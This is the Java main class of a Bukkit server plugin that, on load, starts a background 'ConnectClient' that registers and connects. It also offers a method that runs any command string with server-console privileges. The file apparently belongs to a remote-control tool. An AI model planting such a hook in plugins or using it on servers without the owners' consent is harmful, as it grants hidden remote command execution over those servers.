package br.com.introcdc.connect.client.server;
/*
 * Written by IntroCDC, Bruno Coelho at 10/09/2026 - 23:27
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

public class BukkitMain extends JavaPlugin {

    private static BukkitMain plugin;

    @Override
    public void onEnable() {
        plugin = this;
        Connect.FOLDER = "plugins/";
        Connect.updateRegister(null);
        new Thread(ConnectClient::registerAndStart).start();
    }

    public static void execute(String command) {
        if (plugin != null) {
            Bukkit.getScheduler().runTask(plugin, () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command));
        }
    }

}
